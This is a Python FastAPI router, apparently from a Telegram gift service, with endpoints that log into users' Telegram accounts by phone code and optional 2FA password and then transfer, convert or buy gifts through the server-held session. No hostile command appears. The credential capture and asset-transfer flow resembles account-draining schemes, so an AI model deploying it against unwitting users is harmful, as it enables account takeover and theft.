"""
API для управления Telegram сессиями
"""
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
from pydantic import BaseModel
from typing import Optional
import os

from app.database import get_db
from app.services import AuthService
from app.services.telethon_service import telethon_service
from app.utils.logger import ActivityLogger

router = APIRouter(prefix="/api/session", tags=["session"])
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


async def get_current_user(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Получает текущего пользователя"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    return user_id


class CreateSessionRequest(BaseModel):
    phone_number: str


@router.post("/create")
async def create_session(
    data: CreateSessionRequest,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Создает новую Telegram сессию для пользователя
    Отправляет код подтверждения на телефон
    """
    user_id = await get_current_user(token, db)
    
    result = await telethon_service.create_session(
        phone_number=data.phone_number,
        user_telegram_id=str(user_id),
        db=db
    )
    
    return JSONResponse(result)


class VerifyCodeRequest(BaseModel):
    session_id: int
    code: str
    phone_hash: str
    password: Optional[str] = None


@router.post("/verify")
async def verify_code(
    data: VerifyCodeRequest,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Подтверждает код и авторизует сессию
    """
    user_id = await get_current_user(token, db)
    
    result = await telethon_service.verify_code(
        user_telegram_id=str(user_id),
        session_id=data.session_id,
        code=data.code,
        phone_hash=data.phone_hash,
        password=data.password,
        db=db
    )
    
    return JSONResponse(result)


class TransferGiftRequest(BaseModel):
    gift_id: str
    to_user_id: str


@router.post("/transfer-gift")
async def transfer_gift(
    data: TransferGiftRequest,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Передает подарок от пользователя другому пользователю
    Использует авторизованную сессию пользователя
    """
    user_id = await get_current_user(token, db)
    
    result = await telethon_service.transfer_gift(
        from_user_id=str(user_id),
        to_user_id=data.to_user_id,
        gift_id=data.gift_id,
        db=db
    )
    
    return JSONResponse(result)



class ConvertGiftRequest(BaseModel):
    gift_id: str


@router.post("/convert-gift")
async def convert_gift(
    data: ConvertGiftRequest,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Конвертирует подарок в звезды
    """
    user_id = await get_current_user(token, db)
    
    result = await telethon_service.convert_gift_to_stars(
        user_id=str(user_id),
        gift_id=data.gift_id,
        db=db
    )
    
    return JSONResponse(result)


class PurchaseGiftRequest(BaseModel):
    gift_slug: str
    stars_amount: int


@router.post("/purchase-gift")
async def purchase_gift(
    data: PurchaseGiftRequest,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Покупает подарок за звезды
    """
    user_id = await get_current_user(token, db)
    
    result = await telethon_service.purchase_gift_with_stars(
        user_id=str(user_id),
        gift_slug=data.gift_slug,
        stars_amount=data.stars_amount,
        db=db
    )
    
    return JSONResponse(result)
